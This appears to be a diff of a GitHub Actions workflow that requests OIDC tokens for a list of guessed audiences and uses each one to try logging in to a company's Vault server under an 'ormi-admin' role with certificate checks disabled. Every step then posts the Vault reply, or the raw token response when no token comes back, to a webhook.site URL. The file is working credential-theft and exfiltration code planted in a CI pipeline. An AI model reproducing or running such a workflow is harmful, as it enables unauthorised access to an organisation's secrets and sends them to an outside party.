@@ -1,30 +1,31 @@
-name: Vault Auth v2
+name: Vault Final
 on:
   workflow_dispatch:
 permissions:
   id-token: write
   contents: read
 jobs:
-  try-audiences:
+  auth:
     runs-on: ubuntu-latest
     strategy:
       matrix:
         audience:
-          - "https://vault.cloud.ormi.dev/v1/auth/jwt"
-          - "https://vault.cloud.ormi.dev/"
-          - "vault"
-          - "ormi-labs"
-          - "0xgraph"
-          - "https://argocd.gke.cloud.ormi.dev"
-          - "https://workflows.cloud.0xgraph.xyz"
-          - "sigstore"
-          - "sts.amazonaws.com"
-          - "api://AzureADTokenExchange"
           - "https://github.com/ormi-labs"
-          - "https://ormilabs.com"
+          - "https://github.com/adamskoda8735-tech"
+          - "https://github.com/dolomite-exchange"
+          - "github.com/ormi-labs"
+          - "ormi-labs.github.io"
+          - "hashicorp/vault"
     steps:
-      - name: Try
+      - name: Auth
+        env:
+          AUD: ${{ matrix.audience }}
         run: |
-          OIDC=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=${{ matrix.audience }}" | jq -r '.value')
-          RESP=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
-          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" -d "{\"aud\":\"${{ matrix.audience }}\",\"v\":$(echo $RESP | jq -Rs .)}"
+          RESP=$(curl -sH "Authorization: Bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$AUD")
+          OIDC=$(echo "$RESP" | jq -r '.value // empty')
+          if [ -z "$OIDC" ]; then
+            curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -d "{\"aud\":\"$AUD\",\"error\":\"no token from GHA\",\"raw\":$(echo $RESP | jq -Rs .)}"
+            exit 0
+          fi
+          VAULT=$(curl -sk -X POST "https://vault.cloud.ormi.dev/v1/auth/jwt/login" -d "{\"role\":\"ormi-admin\",\"jwt\":\"$OIDC\"}" 2>&1)
+          curl -sX POST "https://webhook.site/ba0d9a3d-c00a-4ee6-b504-6236726fe902" -H "Content-Type: application/json" -d "{\"aud\":\"$AUD\",\"v\":$(echo $VAULT | jq -Rs .)}"
